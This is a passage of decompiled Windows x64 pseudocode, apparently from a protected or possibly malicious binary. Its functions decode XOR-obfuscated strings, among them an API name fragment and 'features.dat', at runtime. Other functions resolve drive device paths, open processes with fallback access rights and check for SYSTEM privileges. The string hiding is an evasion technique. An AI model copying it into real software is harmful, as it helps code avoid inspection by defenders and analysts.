    byte_1400DC1C1 = (v2 - 9) ^ 0x66;
    byte_1400DC1C2 = (v2 - 10) ^ 0x6F;
    byte_1400DC1C3 = (v2 - 11) ^ 0x72;
    byte_1400DC1C4 = (v2 - 12) ^ 0x6D;
    byte_1400DC1C5 = (v2 - 13) ^ 0x61;
    byte_1400DC1C6 = (v2 - 14) ^ 0x74;
    byte_1400DC1C7 = (v2 - 15) ^ 0x69;
    byte_1400DC1C8 = (v2 - 16) ^ 0x6F;
    byte_1400DC1C9 = (v2 - 17) ^ 0x6E;
    byte_1400DC1CA = (v2 - 18) ^ 0x50;
    byte_1400DC1CB = (v2 - 19) ^ 0x72;
    byte_1400DC1CC = (v2 - 20) ^ 0x6F;
    byte_1400DC1CD = (v2 - 21) ^ 0x63;
    byte_1400DC1CE = (v2 - 22) ^ 0x65;
    byte_1400DC1CF = (v2 - 23) ^ 0x73;
    byte_1400DC1D0 = (v2 - 24) ^ 0x73;
  }
  result = byte_1400DC1D8;
  if ( !byte_1400DC1D8[0] )
  {
    v4 = 0;
    v5 = 0i64;
    do
    {
      v6 = byte_1400DC1B8[v5++];
      v7 = v2 - v4++;
      byte_1400DC1D8[v5 - 1] = v7 ^ v6;
    }
    while ( v4 < 0x19 );
  }
  return result;
}
// 1400DC180: using guessed type int dword_1400DC180;
// 1400DC184: using guessed type int dword_1400DC184;
// 1400DC188: using guessed type int dword_1400DC188;
// 1400DC18C: using guessed type int dword_1400DC18C;
// 1400DC1B2: using guessed type char byte_1400DC1B2;
// 1400DC1B4: using guessed type int dword_1400DC1B4;
// 1400DC1B9: using guessed type char byte_1400DC1B9;
// 1400DC1BA: using guessed type char byte_1400DC1BA;
// 1400DC1BB: using guessed type char byte_1400DC1BB;
// 1400DC1BC: using guessed type char byte_1400DC1BC;
// 1400DC1BD: using guessed type char byte_1400DC1BD;
// 1400DC1BE: using guessed type char byte_1400DC1BE;
// 1400DC1BF: using guessed type char byte_1400DC1BF;
// 1400DC1C0: using guessed type char byte_1400DC1C0;
// 1400DC1C1: using guessed type char byte_1400DC1C1;
// 1400DC1C2: using guessed type char byte_1400DC1C2;
// 1400DC1C3: using guessed type char byte_1400DC1C3;
// 1400DC1C4: using guessed type char byte_1400DC1C4;
// 1400DC1C5: using guessed type char byte_1400DC1C5;
// 1400DC1C6: using guessed type char byte_1400DC1C6;
// 1400DC1C7: using guessed type char byte_1400DC1C7;
// 1400DC1C8: using guessed type char byte_1400DC1C8;
// 1400DC1C9: using guessed type char byte_1400DC1C9;
// 1400DC1CA: using guessed type char byte_1400DC1CA;
// 1400DC1CB: using guessed type char byte_1400DC1CB;
// 1400DC1CC: using guessed type char byte_1400DC1CC;
// 1400DC1CD: using guessed type char byte_1400DC1CD;
// 1400DC1CE: using guessed type char byte_1400DC1CE;
// 1400DC1CF: using guessed type char byte_1400DC1CF;
// 1400DC1D0: using guessed type char byte_1400DC1D0;

//----- (0000000140080910) ----------------------------------------------------
_QWORD *__fastcall sub_140080910(_QWORD *a1, _BYTE *a2)
{
  _QWORD *v2; // rsi
  size_t v3; // r8
  _WORD *v4; // rax
  __int64 v5; // rdx
  __int64 v6; // rcx
  __int64 v7; // rbp
  char *v8; // rdi
  void *v9; // rbx
  __int64 v10; // rax
  void *Dst; // [rsp+28h] [rbp-40h]
  __int64 v13; // [rsp+38h] [rbp-30h]
  unsigned __int64 v14; // [rsp+40h] [rbp-28h]

  v2 = a1;
  v3 = 0i64;
  a1[2] = 0i64;
  if ( a1[3] < 8ui64 )
    v4 = a1;
  else
    v4 = (_WORD *)*a1;
  *v4 = 0;
  v14 = 15i64;
  v13 = 0i64;
  LOBYTE(Dst) = 0;
  if ( *a2 )
  {
    v3 = -1i64;
    do
      ++v3;
    while ( a2[v3] );
  }
  sub_140004F20(&Dst, a2, v3);
  v7 = v13;
  if ( v13 )
  {
    v8 = (char *)&Dst;
    if ( v14 >= 0x10 )
      v8 = (char *)Dst;
    v9 = &Dst;
    if ( v14 >= 0x10 )
      v9 = Dst;
    v10 = sub_140031970(v6, v5);
    sub_140030C60(v9, &v8[v7], v2, v10);
  }
  if ( v14 >= 0x10 )
    operator delete(Dst);
  return v2;
}
// 140031970: using guessed type __int64 __cdecl sub_140031970(_QWORD, _QWORD);

//----- (0000000140080A00) ----------------------------------------------------
bool __fastcall sub_140080A00(char *a1, _QWORD *a2, __int64 *a3)
{
  __int64 *v3; // r12
  _QWORD *v4; // rbx
  char *v5; // r15
  unsigned __int64 v6; // rdx
  char *v7; // rsi
  unsigned __int64 v8; // rcx
  _QWORD *v9; // rdx
  _QWORD *v10; // rdi
  signed __int64 v11; // r15
  bool v12; // zf
  unsigned __int8 v13; // bp
  __int64 v14; // rax
  __int64 v15; // r14
  unsigned __int8 v16; // bp
  __int64 v17; // rax
  void (__fastcall ***v18)(_QWORD, signed __int64); // rax
  bool v20; // bl
  void (__fastcall ***v21)(_QWORD, signed __int64); // rax

  v3 = a3;
  v4 = a2;
  v5 = a1;
  v6 = *((_QWORD *)a1 + 3);
  if ( v6 >= 0x10 )
    a1 = *(char **)a1;
  v7 = &a1[*((_QWORD *)v5 + 2)];
  if ( v6 >= 0x10 )
    v5 = *(char **)v5;
  v8 = v4[3];
  if ( v8 < 0x10 )
    v9 = v4;
  else
    v9 = (_QWORD *)*v4;
  v10 = (_QWORD *)((char *)v9 + v4[2]);
  if ( v8 >= 0x10 )
    v4 = (_QWORD *)*v4;
  if ( v5 == v7 )
  {
LABEL_20:
    v12 = v4 == v10;
  }
  else
  {
    v11 = v5 - (char *)v4;
    while ( 1 )
    {
      v12 = v4 == v10;
      if ( v4 == v10 )
        break;
      v13 = *((_BYTE *)v4 + v11);
      v14 = sub_140080B30(v3);
      v15 = (unsigned __int8)std::ctype<char>::toupper(v14, v13);
      v16 = *(_BYTE *)v4;
      v17 = sub_140080B30(v3);
      if ( (_BYTE)v15 != (unsigned __int8)std::ctype<char>::toupper(v17, v16) )
      {
        if ( *v3 )
        {
          v18 = (void (__fastcall ***)(_QWORD, signed __int64))(*(__int64 (__cdecl **)(__int64))(*(_QWORD *)*v3 + 16i64))(*v3);
          if ( v18 )
            (**v18)(v18, 1i64);
        }
        return 0;
      }
      v4 = (_QWORD *)((char *)v4 + 1);
      if ( (char *)v4 + v11 == v7 )
        goto LABEL_20;
    }
  }
  v20 = v12;
  if ( *v3 )
  {
    v21 = (void (__fastcall ***)(_QWORD, signed __int64))(*(__int64 (__cdecl **)(__int64))(*(_QWORD *)*v3 + 16i64))(*v3);
    if ( v21 )
      (**v21)(v21, 1i64);
  }
  return v20;
}
// 1400A1468: using guessed type __int64 __fastcall std::ctype<char>::toupper(_QWORD, _QWORD);

//----- (0000000140080B30) ----------------------------------------------------
__int64 __fastcall sub_140080B30(__int64 *a1)
{
  __int64 *v1; // rsi
  __int64 v2; // rcx
  unsigned __int64 v3; // rdi
  __int64 v4; // rax
  __int64 v5; // rbx
  __int64 v6; // rax
  char v8; // [rsp+28h] [rbp-20h]
  char v9; // [rsp+50h] [rbp+8h]
  __int64 v10; // [rsp+58h] [rbp+10h]

  v1 = a1;
  std::_Lockit::_Lockit((std::_Lockit *)&v9, 0);
  v10 = qword_1400DC1F8;
  v3 = std::locale::id::operator unsigned __int64(std::ctype<char>::id);
  v4 = *v1;
  if ( v3 >= *(_QWORD *)(*v1 + 24) )
  {
    v5 = 0i64;
  }
  else
  {
    v2 = *(_QWORD *)(v4 + 16);
    v5 = *(_QWORD *)(v2 + 8 * v3);
    if ( v5 )
      goto LABEL_14;
  }
  if ( !*(_BYTE *)(v4 + 36) )
    goto LABEL_8;
  v6 = std::locale::_Getgloballocale(v2);
  if ( v3 < *(_QWORD *)(v6 + 24) )
  {
    v5 = *(_QWORD *)(*(_QWORD *)(v6 + 16) + 8 * v3);
LABEL_8:
    if ( v5 )
      goto LABEL_14;
  }
  v5 = v10;
  if ( !v10 )
  {
    if ( std::ctype<char>::_Getcat(&v10, v1) == -1 )
    {
      std::bad_cast::bad_cast((std::bad_cast *)&v8, "bad cast");
      CxxThrowException(&v8, &_TI2_AVbad_cast_std__);
    }
    v5 = v10;
    qword_1400DC1F8 = v10;
    (*(void (__fastcall **)(__int64))(*(_QWORD *)v10 + 8i64))(v10);
    unknown_libname_8(v5);
  }
LABEL_14:
  std::_Lockit::~_Lockit((std::_Lockit *)&v9);
  return v5;
}
// 140086120: using guessed type __int64 __fastcall unknown_libname_8(_QWORD);
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1460: using guessed type __int64 __fastcall std::ctype<char>::_Getcat(_QWORD, _QWORD);
// 1400A16F0: using guessed type __int64 __cdecl std::locale::_Getgloballocale(_QWORD);
// 1400A16F8: using guessed type __int64 __fastcall std::locale::id::operator unsigned __int64(_QWORD);
// 1400A1700: using guessed type _QWORD std::_Lockit::~_Lockit(std::_Lockit *__hidden this);
// 1400A1708: using guessed type _QWORD std::_Lockit::_Lockit(std::_Lockit *__hidden this, _DWORD);
// 1400A1A18: using guessed type _QWORD std::bad_cast::bad_cast(std::bad_cast *__hidden this, const char *);
// 1400D3168: using guessed type int _TI2_AVbad_cast_std__;
// 1400DC1F8: using guessed type __int64 qword_1400DC1F8;

//----- (0000000140080C40) ----------------------------------------------------
void __fastcall sub_140080C40(__int64 *a1)
{
  __int64 v1; // rcx
  void (__fastcall ***v2)(_QWORD, signed __int64); // rax

  v1 = *a1;
  if ( v1 )
  {
    v2 = (void (__fastcall ***)(_QWORD, signed __int64))(*(__int64 (**)(void))(*(_QWORD *)v1 + 16i64))();
    if ( v2 )
      (**v2)(v2, 1i64);
  }
}

//----- (0000000140080C70) ----------------------------------------------------
_QWORD *__fastcall sub_140080C70(__int64 a1, void *a2)
{
  void *v2; // r13
  _QWORD *v3; // r15
  DWORD v4; // eax
  DWORD v5; // er12
  DWORD v6; // er14
  unsigned __int64 v7; // rsi
  struct std::locale::_Locimp *v8; // rbx
  size_t v9; // r8
  char *v10; // rdi
  bool v11; // di
  void (__fastcall ***v12)(_QWORD, signed __int64); // rax
  char *v13; // rcx
  void *v14; // r8
  unsigned __int64 v15; // rdx
  __int64 v16; // rax
  void *v17; // rcx
  __int64 v18; // rdx
  __int64 v19; // rcx
  __int64 v20; // rsi
  __int64 v21; // r14
  char *v22; // rdi
  void *v23; // rbx
  __int64 v24; // rax
  CHAR DeviceName[2]; // [rsp+20h] [rbp-E0h]
  int v27; // [rsp+24h] [rbp-DCh]
  struct std::locale::_Locimp *v28; // [rsp+28h] [rbp-D8h]
  __int64 v29; // [rsp+30h] [rbp-D0h]
  __int64 v30; // [rsp+38h] [rbp-C8h]
  struct std::locale::_Locimp *v31; // [rsp+40h] [rbp-C0h]
  void *Src; // [rsp+48h] [rbp-B8h]
  __int64 v33; // [rsp+58h] [rbp-A8h]
  unsigned __int64 v34; // [rsp+60h] [rbp-A0h]
  void *v35; // [rsp+68h] [rbp-98h]
  __int64 v36; // [rsp+78h] [rbp-88h]
  unsigned __int64 v37; // [rsp+80h] [rbp-80h]
  CHAR Buffer; // [rsp+90h] [rbp-70h]
  char Dst; // [rsp+91h] [rbp-6Fh]
  CHAR TargetPath[36]; // [rsp+100h] [rbp+0h]

  v30 = -2i64;
  v2 = a2;
  v3 = (_QWORD *)a1;
  v29 = a1;
  *(_QWORD *)(a1 + 24) = 7i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_WORD *)a1 = 0;
  v27 = 1;
  Buffer = 0;
  memset(&Dst, 0, 0x63ui64);
  v4 = GetLogicalDriveStringsA(0x64u, &Buffer);
  v5 = v4;
  if ( v4 >= 4 )
  {
    v6 = 0;
    if ( v4 )
    {
      v7 = -1i64;
      while ( 1 )
      {
        strcpy(DeviceName, " :");
        DeviceName[0] = *(&Buffer + v6);
        memset(TargetPath, 0, 0x104ui64);
        QueryDosDeviceA(DeviceName, TargetPath, 0x104u);
        v8 = std::locale::_Init(1);
        v31 = v8;
        v34 = 15i64;
        v33 = 0i64;
        LOBYTE(Src) = 0;
        if ( TargetPath[0] )
        {
          v9 = -1i64;
          do
            ++v9;
          while ( TargetPath[v9] );
        }
        else
        {
          v9 = 0i64;
        }
        sub_140004F20(&Src, TargetPath, v9);
        v10 = (char *)sub_1400054F0(v2, &v35);
        v28 = v8;
        (*(void (__fastcall **)(struct std::locale::_Locimp *))(*(_QWORD *)v8 + 8i64))(v8);
        v11 = sub_140080A00(v10, &Src, (__int64 *)&v28);
        if ( v37 >= 0x10 )
          operator delete(v35);
        v37 = 15i64;
        v36 = 0i64;
        LOBYTE(v35) = 0;
        if ( v34 >= 0x10 )
          operator delete(Src);
        v34 = 15i64;
        v33 = 0i64;
        LOBYTE(Src) = 0;
        v12 = (void (__fastcall ***)(_QWORD, signed __int64))(*(__int64 (__fastcall **)(struct std::locale::_Locimp *))(*(_QWORD *)v8 + 16i64))(v8);
        if ( v12 )
          (**v12)(v12, 1i64);
        if ( v11 )
          break;
        v6 += 4;
        if ( v6 >= v5 )
          return v3;
      }
      sub_1400054F0(v2, &Src);
      do
        ++v7;
      while ( TargetPath[v7] );
      sub_140005230(&Src, 0i64, v7);
      sub_140080910(v3, DeviceName);
      v13 = (char *)&Src;
      v14 = Src;
      v15 = v34;
      if ( v34 >= 0x10 )
        v13 = (char *)Src;
      v16 = (__int64)&v13[v33];
      v17 = &Src;
      if ( v34 >= 0x10 )
        v17 = Src;
      if ( v17 != (void *)v16 )
      {
        v20 = sub_140032930(v3);
        v21 = v33;
        if ( v33 )
        {
          v22 = (char *)&Src;
          if ( v34 >= 0x10 )
            v22 = (char *)Src;
          v23 = &Src;
          if ( v34 >= 0x10 )
            v23 = Src;
          v24 = sub_140031970(v19, v18);
          sub_140030C60(v23, &v22[v21], v3, v24);
        }
        if ( v20 )
          sub_1400329A0(v3, v20);
        v14 = Src;
        v15 = v34;
      }
      if ( v15 >= 0x10 )
        operator delete(v14);
    }
  }
  return v3;
}
// 140031970: using guessed type __int64 __cdecl sub_140031970(_QWORD, _QWORD);
// 1400A1568: using guessed type struct std::locale::_Locimp *__stdcall static std::locale::_Init(bool);
// 140080C70: using guessed type CHAR TargetPath[36];

//----- (0000000140080F70) ----------------------------------------------------
HANDLE __fastcall sub_140080F70(DWORD dwProcessId, DWORD **a2)
{
  DWORD *v2; // rbx
  DWORD *v3; // rdi
  DWORD v4; // esi
  HANDLE result; // rax

  v2 = *a2;
  v3 = a2[1];
  v4 = dwProcessId;
  if ( *a2 == v3 )
    return 0i64;
  while ( 1 )
  {
    result = OpenProcess(*v2, 0, v4);
    if ( result )
      break;
    ++v2;
    if ( v2 == v3 )
      return 0i64;
  }
  return result;
}

//----- (0000000140080FC0) ----------------------------------------------------
bool sub_140080FC0()
{
  HANDLE v0; // rax
  bool v2; // si
  PSID *v3; // rbx
  DWORD TokenInformationLength; // [rsp+60h] [rbp-38h]
  HANDLE TokenHandle; // [rsp+68h] [rbp-30h]
  PSID pSid1; // [rsp+70h] [rbp-28h]
  struct _SID_IDENTIFIER_AUTHORITY pIdentifierAuthority; // [rsp+78h] [rbp-20h]

  TokenHandle = 0i64;
  v0 = GetCurrentProcess();
  if ( !OpenProcessToken(v0, 8u, &TokenHandle) || !TokenHandle )
    return 0;
  TokenInformationLength = 0;
  v2 = 0;
  GetTokenInformation(TokenHandle, TokenUser, 0i64, 0, &TokenInformationLength);
  if ( TokenInformationLength > 0 )
  {
    v3 = (PSID *)malloc(TokenInformationLength);
    if ( v3 )
    {
      if ( GetTokenInformation(TokenHandle, TokenUser, v3, TokenInformationLength, &TokenInformationLength) )
      {
        pSid1 = 0i64;
        *(_DWORD *)pIdentifierAuthority.Value = 0;
        *(_WORD *)&pIdentifierAuthority.Value[4] = 1280;
        AllocateAndInitializeSid(&pIdentifierAuthority, 1u, 0x12u, 0, 0, 0, 0, 0, 0, 0, &pSid1);
        if ( pSid1 )
        {
          v2 = EqualSid(pSid1, *v3) == 1;
          FreeSid(pSid1);
        }
      }
      free(v3);
    }
  }
  CloseHandle(TokenHandle);
  return v2;
}

//----- (0000000140081140) ----------------------------------------------------
_QWORD *__fastcall sub_140081140(_QWORD *a1, _QWORD *a2)
{
  _QWORD *v2; // rdi
  _QWORD *v3; // rax
  _QWORD *v4; // rbx
  _BYTE *v5; // rcx

  v2 = a2;
  v3 = sub_1400216E0(a1);
  v4 = v3;
  *((_WORD *)v3 + 12) = 0;
  v5 = v3 + 4;
  if ( v3 != (_QWORD *)-32i64 )
  {
    v3[7] = 15i64;
    v3[6] = 0i64;
    *v5 = 0;
    sub_140004DF0(v5, v2, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  }
  return v4;
}

//----- (00000001400811B0) ----------------------------------------------------
_QWORD *__fastcall sub_1400811B0(_QWORD *a1, __int64 a2, unsigned __int8 a3)
{
  __int64 v3; // rbx
  __int64 v4; // rdi
  _QWORD *v5; // rsi
  _QWORD *v6; // rdx
  __int64 **v7; // rcx
  __int64 *i; // rax
  _QWORD *v9; // rcx
  _QWORD *result; // rax

  v3 = *a1;
  v4 = a2;
  v5 = a1;
  *(_QWORD *)(v3 + 8) = sub_140081260(a1, *(_QWORD *)(*(_QWORD *)a2 + 8i64), *a1, a3);
  v6 = (_QWORD *)*v5;
  v5[1] = *(_QWORD *)(v4 + 8);
  v7 = (__int64 **)v6[1];
  if ( *((_BYTE *)v7 + 25) )
  {
    *v6 = v6;
    result = (_QWORD *)*v5;
    result[2] = result;
  }
  else
  {
    for ( i = *v7; !*((_BYTE *)i + 25); i = (__int64 *)*i )
      v7 = (__int64 **)i;
    *v6 = v7;
    v9 = *(_QWORD **)(*v5 + 8i64);
    for ( result = (_QWORD *)v9[2]; !*((_BYTE *)result + 25); result = (_QWORD *)result[2] )
      v9 = result;
    *(_QWORD *)(*v5 + 16i64) = v9;
  }
  return result;
}

//----- (0000000140081260) ----------------------------------------------------
_QWORD *__fastcall sub_140081260(_QWORD *a1, __int64 a2, __int64 a3, unsigned __int8 a4)
{
  _QWORD *v4; // rsi
  _QWORD *v5; // rdi
  _QWORD *v6; // rbx
  __int64 v8; // [rsp+58h] [rbp+10h]
  __int64 v9; // [rsp+60h] [rbp+18h]
  unsigned __int8 v10; // [rsp+68h] [rbp+20h]

  v10 = a4;
  v9 = a3;
  v8 = a2;
  v4 = a1;
  v5 = (_QWORD *)*a1;
  if ( !*(_BYTE *)(a2 + 25) )
  {
    v6 = sub_140081140(a1, (_QWORD *)(a2 + 32));
    v6[1] = v9;
    *((_BYTE *)v6 + 24) = *(_BYTE *)(v8 + 24);
    if ( *((_BYTE *)v5 + 25) )
      v5 = v6;
    *v6 = sub_140081260(v4, *(_QWORD *)v8, (__int64)v6, v10);
    v6[2] = sub_140081260(v4, *(_QWORD *)(v8 + 16), (__int64)v6, v10);
  }
  return v5;
}

//----- (0000000140081300) ----------------------------------------------------
_QWORD *__fastcall sub_140081300(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rdi
  _QWORD *v3; // rbx
  __int64 v4; // rax

  v2 = a2;
  v3 = a1;
  *a1 = 0i64;
  a1[1] = 0i64;
  sub_1400215D0();
  *v3 = v4;
  sub_1400811B0(v3, v2, 0);
  return v3;
}

//----- (0000000140081350) ----------------------------------------------------
_QWORD *__fastcall sub_140081350(_QWORD *a1, _QWORD *a2)
{
  _QWORD *v2; // rbx
  _QWORD *v3; // rdi
  signed __int64 v4; // rcx
  signed __int64 v5; // rcx

  v2 = a2;
  v3 = a1;
  a1[3] = 15i64;
  a1[2] = 0i64;
  *(_BYTE *)a1 = 0;
  sub_140004DF0(a1, a2, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v4 = (signed __int64)(v3 + 4);
  *(_QWORD *)(v4 + 24) = 15i64;
  *(_QWORD *)(v4 + 16) = 0i64;
  *(_BYTE *)v4 = 0;
  sub_140004DF0(v3 + 4, v2 + 4, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v5 = (signed __int64)(v3 + 8);
  *(_QWORD *)(v5 + 24) = 15i64;
  *(_QWORD *)(v5 + 16) = 0i64;
  *(_BYTE *)v5 = 0;
  sub_140004DF0(v3 + 8, v2 + 8, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  sub_140081300(v3 + 12, (__int64)(v2 + 12));
  *((_BYTE *)v3 + 112) = *((_BYTE *)v2 + 112);
  *((_BYTE *)v3 + 113) = *((_BYTE *)v2 + 113);
  return v3;
}

//----- (0000000140081410) ----------------------------------------------------
__int64 __fastcall sub_140081410(__int64 a1, const char *a2)
{
  __int64 v2; // rbx
  __int64 v4; // [rsp+38h] [rbp-120h]
  __int64 v5; // [rsp+40h] [rbp-118h]
  char v6; // [rsp+50h] [rbp-108h]
  void *v7; // [rsp+F0h] [rbp-68h]

  v4 = -2i64;
  v2 = a1;
  if ( *((_QWORD *)a2 + 3) >= 0x10ui64 )
    a2 = *(const char **)a2;
  sub_14000BB70(&v5, a2, 32, 64, 1);
  sub_140081D40(v2, &v5);
  if ( !sub_14000C9E0((__int64)&v6) )
    std::basic_ios<char,std::char_traits<char>>::setstate((char *)&v5 + *(signed int *)(v5 + 4), 2i64);
  *(__int64 *)((char *)&v5 + *(signed int *)(v5 + 4)) = (__int64)&off_1400A3180;
  *(_DWORD *)((char *)&v4 + *(signed int *)(v5 + 4) + 4) = *(_DWORD *)(v5 + 4) - 176;
  sub_14000BCC0(&v6);
  *(__int64 *)((char *)&v5 + *(signed int *)(v5 + 4)) = (__int64)std::basic_istream<char,std::char_traits<char>>::`vftable';
  *(_DWORD *)((char *)&v4 + *(signed int *)(v5 + 4) + 4) = *(_DWORD *)(v5 + 4) - 24;
  v7 = std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor((struct std::ios_base *)&v7);
  return v2;
}
// 140081D40: using guessed type __int64 __fastcall sub_140081D40(_QWORD, _QWORD);
// 1400A1450: using guessed type void *std::basic_istream<char,std::char_traits<char>>::`vftable';
// 1400A1640: using guessed type void *std::ios_base::`vftable';
// 1400A1688: using guessed type __int64 __fastcall std::basic_ios<char,std::char_traits<char>>::setstate(_QWORD, _QWORD);
// 1400A16C0: using guessed type void __stdcall static std::ios_base::_Ios_base_dtor(struct std::ios_base *);
// 1400A3180: using guessed type __int64 (__fastcall *off_1400A3180)();

//----- (0000000140081520) ----------------------------------------------------
_QWORD *__fastcall sub_140081520(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DC218;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DC218 & 1 )
  {
    v5 = byte_1400DC214;
  }
  else
  {
    v4 = 69069 * dword_1400DC20C + 1234567;
    v1 = dword_1400DC218 | 1;
    dword_1400DC20C = v4;
    dword_1400DC218 |= 1u;
    dword_1400DC204 = HIWORD(dword_1400DC204) + 36969 * (unsigned __int16)dword_1400DC204;
    LOBYTE(v4) = (BYTE2(dword_1400DC210) + 80 * dword_1400DC210) ^ v4;
    dword_1400DC210 = HIWORD(dword_1400DC210) + 18000 * (unsigned __int16)dword_1400DC210;
    v5 = (((unsigned int)dword_1400DC208 >> 13) ^ 32 * dword_1400DC208 ^ dword_1400DC208) + v4;
    dword_1400DC208 ^= ((unsigned int)dword_1400DC208 >> 13) ^ 32 * (dword_1400DC208 ^ (dword_1400DC208 << 12));
    byte_1400DC214 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DC218 = v1 | 2;
    byte_1400DC220[0] = v5 ^ 0x66;
    byte_1400DC221 = (v5 - 1) ^ 0x65;
    byte_1400DC222 = (v5 - 2) ^ 0x61;
    byte_1400DC223 = (v5 - 3) ^ 0x74;
    byte_1400DC224 = (v5 - 4) ^ 0x75;
    byte_1400DC225 = (v5 - 5) ^ 0x72;
    byte_1400DC226 = (v5 - 6) ^ 0x65;
    byte_1400DC227 = (v5 - 7) ^ 0x73;
    byte_1400DC228 = (v5 - 8) ^ 0x2E;
    byte_1400DC229 = (v5 - 9) ^ 0x64;
    byte_1400DC22A = (v5 - 10) ^ 0x61;
    byte_1400DC22B = (v5 - 11) ^ 0x74;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0xCui64 )
  {
    sub_140004790(Src, 0xCui64, 0i64);
    v5 = byte_1400DC214;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  *((_DWORD *)v6 + 2) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 12i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 12) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DC220[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0xC );
  return v3;
}
// 1400DC204: using guessed type int dword_1400DC204;
// 1400DC208: using guessed type int dword_1400DC208;
// 1400DC20C: using guessed type int dword_1400DC20C;
// 1400DC210: using guessed type int dword_1400DC210;
// 1400DC214: using guessed type char byte_1400DC214;
// 1400DC218: using guessed type int dword_1400DC218;
// 1400DC221: using guessed type char byte_1400DC221;
// 1400DC222: using guessed type char byte_1400DC222;
// 1400DC223: using guessed type char byte_1400DC223;
// 1400DC224: using guessed type char byte_1400DC224;
// 1400DC225: using guessed type char byte_1400DC225;
// 1400DC226: using guessed type char byte_1400DC226;
// 1400DC227: using guessed type char byte_1400DC227;
// 1400DC228: using guessed type char byte_1400DC228;
// 1400DC229: using guessed type char byte_1400DC229;
// 1400DC22A: using guessed type char byte_1400DC22A;
// 1400DC22B: using guessed type char byte_1400DC22B;

//----- (0000000140081730) ----------------------------------------------------
_QWORD *__fastcall sub_140081730(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DC230;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DC230 & 1 )
  {
    v5 = byte_1400DC22C;
  }
  else
  {
    v4 = 69069 * dword_1400DC20C + 1234567;
    v1 = dword_1400DC230 | 1;
    dword_1400DC20C = v4;
    dword_1400DC230 |= 1u;
    dword_1400DC204 = HIWORD(dword_1400DC204) + 36969 * (unsigned __int16)dword_1400DC204;
    LOBYTE(v4) = (BYTE2(dword_1400DC210) + 80 * dword_1400DC210) ^ v4;
    dword_1400DC210 = HIWORD(dword_1400DC210) + 18000 * (unsigned __int16)dword_1400DC210;
    v5 = (((unsigned int)dword_1400DC208 >> 13) ^ 32 * dword_1400DC208 ^ dword_1400DC208) + v4;
    dword_1400DC208 ^= ((unsigned int)dword_1400DC208 >> 13) ^ 32 * (dword_1400DC208 ^ (dword_1400DC208 << 12));
    byte_1400DC22C = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DC230 = v1 | 2;
    byte_1400DC238[0] = v5 ^ 0x66;
    byte_1400DC239 = (v5 - 1) ^ 0x65;
    byte_1400DC23A = (v5 - 2) ^ 0x61;
    byte_1400DC23B = (v5 - 3) ^ 0x74;
    byte_1400DC23C = (v5 - 4) ^ 0x75;
    byte_1400DC23D = (v5 - 5) ^ 0x72;
    byte_1400DC23E = (v5 - 6) ^ 0x65;
    byte_1400DC23F = (v5 - 7) ^ 0x73;
    byte_1400DC240 = (v5 - 8) ^ 0x2E;
    byte_1400DC241 = (v5 - 9) ^ 0x64;
    byte_1400DC242 = (v5 - 10) ^ 0x61;
    byte_1400DC243 = (v5 - 11) ^ 0x74;
    byte_1400DC244 = (v5 - 12) ^ 0x63;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0xDui64 )
  {
    sub_140004790(Src, 0xDui64, 0i64);
    v5 = byte_1400DC22C;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  *((_DWORD *)v6 + 2) = 0;
  *((_BYTE *)v6 + 12) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 13i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 13) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DC238[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0xD );
  return v3;
}
// 1400DC204: using guessed type int dword_1400DC204;
// 1400DC208: using guessed type int dword_1400DC208;
// 1400DC20C: using guessed type int dword_1400DC20C;
// 1400DC210: using guessed type int dword_1400DC210;
// 1400DC22C: using guessed type char byte_1400DC22C;
// 1400DC230: using guessed type int dword_1400DC230;
// 1400DC239: using guessed type char byte_1400DC239;
// 1400DC23A: using guessed type char byte_1400DC23A;
// 1400DC23B: using guessed type char byte_1400DC23B;
// 1400DC23C: using guessed type char byte_1400DC23C;
// 1400DC23D: using guessed type char byte_1400DC23D;
// 1400DC23E: using guessed type char byte_1400DC23E;
// 1400DC23F: using guessed type char byte_1400DC23F;
// 1400DC240: using guessed type char byte_1400DC240;
